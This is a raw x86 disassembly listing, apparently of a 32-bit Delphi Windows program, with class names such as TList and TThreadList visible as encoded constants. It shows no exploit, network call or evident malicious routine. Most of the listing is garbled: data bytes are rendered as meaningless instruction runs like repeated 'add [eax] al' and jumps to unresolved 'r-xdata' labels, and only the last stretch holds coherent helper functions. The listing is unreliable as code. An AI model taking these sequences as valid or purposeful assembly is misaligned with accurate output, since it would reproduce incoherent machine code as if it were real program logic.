xor al [ eax ]
inc esp
xor al [ eax ]
clc
cmp [ ecx ] al
pushfd
cmp al [ ecx ]
test [ ecx + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x10004117
jne r-xdata
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
loopne r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0xa004032 ] al
inc eax
add [ eax + 0x16 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x16 ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
add [ ecx + edi + 0x41 ] cl
add al cl
cmp [ ecx ] eax
add eax 0x73694c54
je r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x1758c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
fdivr [ ecx + eax * 2 ]
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x18
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
push eax
inc ecx
add [ 0x74694254 ] al
jae r-xdata
inc eax
shr [ eax + 0x18 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x17 ] ch
inc ecx
add [ eax ] dl
arpl [ ebp + 0x73 ] sp
clc
push ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
push ss
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
inc eax
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add al 0x40
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ecx + eax * 2 ] bl
inc ecx
add [ eax ] dh
inc eax
inc ecx
add [ edx ] al
add bh bh
inc ecx
add [ edx + 0x4004118 ] al
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
xor al [ eax ]
sbb al 0xb6
inc eax
add [ eax + 0xf004032 ] al
inc ebp
dec edi
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
outsd
jb r-xdata
jb r-xdata
push ss
inc ecx
add [ eax ] al
add [ eax ] al
sub_4117ed
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
push eax
inc ecx
add [ 0x74694254 ] al
jae r-xdata
inc eax
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
fdivr [ ecx + eax * 2 ]
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x18
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
shr [ eax + 0x18 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add al 0x40
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ecx + eax * 2 ] bl
inc ecx
add [ eax ] dh
inc eax
inc ecx
add [ edx ] al
add bh bh
inc ecx
add [ edx + 0x4004118 ] al
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
sub_411879
call eax
inc ecx
inc ecx
add [ eax ] ah
inc ecx
inc ecx
add [ ebx ] cl
push esp
push eax
jb r-xdata
add [ esi - 0x23 ] al
sbb [ ecx ] al
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
pop eax
sbb [ ecx ] eax
jmp r-xdata
imul esi [ ebx + 0x74 ] 0x8b746e65
rcl [ eax + ebx + 0xb070041 ] 0x54
push eax
jb r-xdata
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a4b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
inc ecx
add cl ch
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
push 0x94004119
sbb [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
imul esi [ ebx + 0x74 ] 0x68746e65
sbb [ ecx ] al
hlt
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add al 0x40
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ecx + eax * 2 ] bl
inc ecx
add [ eax ] dh
inc eax
inc ecx
add [ edx + eax * 2 + 0x41 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] dl
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sbb al 0x18
inc ecx
add al bl
xor al 0x40
add ah dl
inc ecx
inc ecx
add al ch
xor al 0x40
add ah ch
xor al 0x40
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
add ah cl
dec esp
inc ecx
add [ eax ] al
dec ebp
inc ecx
add [ eax + 0x4e ] ch
inc ecx
add al dh
dec esi
inc ecx
add [ eax + 0x3800414f ] dh
push eax
inc ecx
add [ ebx + eax * 2 + 0x41 ] al
add [ eax + 0x43 ] ch
inc ecx
add [ ebx + eax * 2 + 0x2a980041 ] cl
inc eax
add [ eax - 0x17ffbfd6 ] bl
inc esi
inc ecx
add ah bl
inc edi
inc ecx
add [ eax + 0x49 ] bl
inc ecx
add ah ah
dec ecx
inc ecx
add [ eax - 0x67ffbeb6 ] bh
sub al [ eax ]
in al dx
dec edx
inc ecx
add [ ebx + ecx * 2 ] bl
inc ecx
add [ eax + 0x4b ] dh
inc ecx
add [ esp + ecx * 2 ] bl
inc ecx
add [ ebp + ecx * 2 + 0x4e0c0041 ] dh
inc ecx
add [ eax + 0xe00414e ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
sbb [ ecx ] eax
or al 0x0
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0x94746e65
sbb [ ecx ] eax
pop es
adc eax 0x746e4954
jb r-xdata
add [ eax ] al
add [ esp + ebx ] cl
inc ecx
add [ eax ] dh
add [ eax ] al
add al bh
sbb [ ecx ] eax
outsb
jae r-xdata
dec [ ebx + 0x411a44c0 ]
add [ eax ] al
add bh bh
add ah al
sbb al [ ecx ]
in al 0x1a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add ah bl
inc edi
inc ecx
add [ eax - 0x1bffbead ] bh
dec ecx
inc ecx
add [ eax - 0xbffbeb6 ] bh
push ebx
inc ecx
add [ esp + edx * 2 ] al
inc ecx
add [ ebx + ecx * 2 ] bl
inc ecx
add [ eax + 0x4b ] dh
inc ecx
add [ esp + ecx * 2 ] bl
inc ecx
add [ ebp + ecx * 2 + 0x4e0c0041 ] dh
inc ecx
add [ eax + 0x4400414e ] ah
push ecx
inc ecx
add [ eax + 0x51 ] ah
inc ecx
add [ eax + 0x54 ] bl
inc ecx
add [ eax + 0x68004152 ] ch
push esi
inc ecx
add [ eax + 0x56 ] bh
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ebp + eax * 2 + 0x41 ] cl
in al 0x1a
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sbb al [ ecx ]
adc [ eax ] al
add [ eax ] al
sbb al 0x18
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
salc
imul esi [ ebx + 0x74 ] 0x58746e65
sbb [ ecx ] eax
nop
sbb [ ecx ] al
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0x4032 ] al
imul ebp [ esi + 0x67 ] 0x7473694c
sbb al 0x1c
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
fdiv [ eax + eax * 2 ]
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
js r-xdata
outsb
jae r-xdata
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
adc al 0x43
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ ebp + eax * 2 + 0x41 ] cl
add [ esp + eax * 2 + 0x41 ] al
add [ eax - 0x2fffbfd6 ] bl
inc edi
inc ecx
add [ eax - 0x27ffbfd6 ] bl
inc edi
inc ecx
add [ eax ] dh
dec eax
inc ecx
inc eax
jae r-xdata
push ebx
je r-xdata
popad
add [ edi + edx * 2 + 0x41 ] cl
add [ edi + edx * 2 + 0x41 ] ah
add [ eax - 0x67ffbfd6 ] bl
sub al [ eax ]
add al 0x58
inc ecx
add [ eax + 0x7004158 ] cl
push esp
push ebx
je r-xdata
add [ edi + 0x41 ] dl
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ esp + ebx ] bl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al [ ecx ]
nop
sbb [ ecx ] al
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
add [ eax + r-xdata ] dl
push ebx
je r-xdata
popad
insd
mov eax eax
je r-xdata
push edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x400411c ] ch
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] al
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push eax
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
call sub_415ebe
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx ] al
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x1c ] al
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] al
push edi
inc ecx
add [ edi + edx * 2 + 0x41 ] cl
add [ edi + edx * 2 + 0x41 ] ah
add [ ebp + ebx * 2 + 0x41 ] dl
add [ eax - 0x73ffbfd6 ] bl
pop ebp
inc ecx
add [ eax + 0x13004158 ] cl
push esp
inc ebx
jne r-xdata
add [ eax + 0x800411d ] dl
add [ eax ] al
add [ eax - 0x27ffbee4 ] dh
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sbb [ ebp + 0x41 ] bl
add [ eax ] al
push edi
inc ecx
add [ ebx + ebx * 2 + 0x41 ] al
add [ eax + 0x5b ] bl
inc ecx
add al bh
pop edx
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add [ eax + ebx * 2 ] al
inc ecx
add [ eax ] bl
pop ebx
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
jae r-xdata
add [ ebx + 0x411b08c0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
jns r-xdata
push ebx
je r-xdata
mov [ eax + 0x41 ] bl
je r-xdata
add [ eax ] bl
pop ebx
inc ecx
add [ 0x6e614854 ] cl
insb
insd
cld
sbb al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sbb eax 0x80041
add [ eax ] al
inc eax
sbb al 0x41
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] al
push edi
inc ecx
add [ ebx + ebx * 2 + 0x41 ] al
add [ eax + 0x5b ] bl
inc ecx
add al bh
pop edx
inc ecx
add [ eax ] cl
pop ebx
inc ecx
add [ eax + ebx * 2 ] al
inc ecx
popad
add [ ebp + 0x1c8c0040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 2 + 0x41 ] al
add [ eax ] ah
push ebx
inc ecx
add [ ebx + edx * 2 + 0x41 ] dl
add [ eax + 0x53 ] bl
inc ecx
add [ ebx + edx * 2 + 0x41 ] bl
add [ eax ] dh
dec eax
inc ecx
add al dl
push esp
inc ecx
add [ edx * 2 + 0x56000041 ] ch
inc ecx
add al dh
dec esi
inc ecx
add [ esi + edx * 2 ] bh
inc ecx
add [ eax - 0x2bffbeaa ] dh
push eax
inc ecx
add al ah
push eax
inc ecx
add [ ebx + eax * 2 + 0x517c0041 ] cl
inc ecx
add [ ecx + edx * 2 + 0x52280041 ] bh
dec esp
outsb
dec ecx
je r-xdata
add [ edi + 0x41 ] dl
je r-xdata
insd
add [ eax + 0xd00415e ] al
push esp
dec ebp
popad
insd
push ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx + 0x140041 ] al
add [ eax ] al
pushfd
sbb eax 0x34d80041
inc eax
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov al 0x5d
inc ecx
add [ eax ] al
push edi
inc ecx
add [ esi + ebx * 2 + 0x41 ] dl
add [ edi + edx * 2 + 0x41 ] ah
add [ ebp + ebx * 2 + 0x41 ] dl
add [ edi + ebx * 2 ] cl
inc ecx
add [ ebp + ebx * 2 + 0x58880041 ] cl
inc ecx
push ebx
push ebx
outsd
jb r-xdata
inc ecx
add [ eax - 0x7fffbea8 ] cl
pop esi
inc ecx
add [ 0x6d654d54 ] cl
inc ebp
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
je r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
popad
insd
mov eax eax
loopne r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
add [ edi + edx * 2 + 0x41 ] cl
add [ edi + edx * 2 + 0x41 ] ah
add [ ebp + ebx * 2 + 0x41 ] dl
add al cl
pushad
inc ecx
add [ ebp + ebx * 2 + 0x58880041 ] cl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
cld
push ds
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ebp + ebx + 0x34d80041 ] bl
inc eax
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
nop
pushad
inc ecx
add [ eax ] al
push edi
inc ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sub_412025
pop ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004120 ] bl
add [ eax ] al
add [ ecx + edx + 0x34d80040 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
add al 0x21
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
call 0x5041631c
popad
inc ecx
add [ eax + 0x68 ] cl
inc ecx
add [ eax + ebp * 2 + 0x41 ] bh
add [ eax + 0x6c00416b ] dl
imul eax [ ecx ] sub_418a98
mov [ ecx + 0x41 ] gs
add [ eax - 0x75 ] ch
inc ecx
add [ eax - 0x75 ] dl
inc ecx
add ah cl
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] ah
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub [ ecx + 0x41 ] ah
add [ eax + 0x61 ] dl
inc ecx
add [ eax - 0x67ffbfd6 ] bl
sub al [ eax ]
cwde
sub al [ eax ]
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x4121b490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
and [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
or al 0x0
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edi ] al
inc ebp
push esp
push 0x64616572
push eax
and al [ ecx ]
or cl [ esi ]
push esp
inc ebx
outsd
insd
jo r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add ah cl
push esi
inc eax
add al bl
push esi
inc eax
add ah ch
xor al 0x40
add al ah
xor al 0x40
add al ch
push esi
inc eax
add [ edx + esi + 0x40 ] al
add [ edi + ebx * 4 + 0x41 ] ch
add [ edi + ebx * 4 - 0x5ff3ffbf ] ah
inc ecx
add [ eax + 0x41 ] dh
add al bh
mov al [ 0xffffffffa15c0041 ]
inc ecx
add [ ebx + 0x41 ] bl
add [ eax - 0x5d ] ch
inc ecx
add [ ebx + 0x41 ] dh
add [ eax - 0x73ffbe5d ] al
mov [ 0xffffffffa4080041 ] eax
inc ecx
add [ esi ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
and [ ecx ] al
sbb [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] eax
fdiv [ eax + eax * 2 ]
hlt
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx al
and [ ecx ] eax
jl r-xdata
rol [ edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and al [ ecx ]
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
and al [ fs : ecx ]
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_4120ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_412618
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e60
pop edi
pop esi
pop ebx
retn
sub_412640
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e44
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412668
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405e68
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412760
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_413a74
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_4034bc
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_4034bc
test al al
je r-xdata
sub_4127c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412760
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412760
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_4034bc
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412830
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403260
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413918
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_4128ac
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
mov eax [ esi + 0x4 ]
call sub_403290
mov eax [ esi + 0x8 ]
call sub_403290
mov eax [ esi + 0xc ]
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4128ec
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_413a74
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031f4
test al al
jne r-xdata
sub_41294c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_413a74
mov edx eax
mov eax ebp
call sub_4034bc
test al al
jne r-xdata
sub_412990
push ebp
mov ebp esp
